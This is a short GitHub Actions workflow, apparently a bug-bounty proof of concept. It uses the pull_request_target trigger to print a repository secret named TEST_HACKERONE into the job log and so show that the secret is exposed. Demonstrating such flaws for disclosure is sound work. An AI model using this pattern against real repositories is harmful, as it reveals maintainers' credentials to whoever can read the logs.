name: Proof of Concept
on:
  pull_request_target:
    branches: [ main ]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Prove vulnerability
        run: |
          echo "=== PROOF OF VULNERABILITY ==="
          echo "Repository: ${{ github.repository }}"
          echo "Event: ${{ github.event_name }}"
          echo ""
          echo "SECRET TEST_HACKERONE:"
          echo "${{ secrets.TEST_HACKERONE }}"
          echo ""
          echo "If you see a secret value above, vulnerability is confirmed."
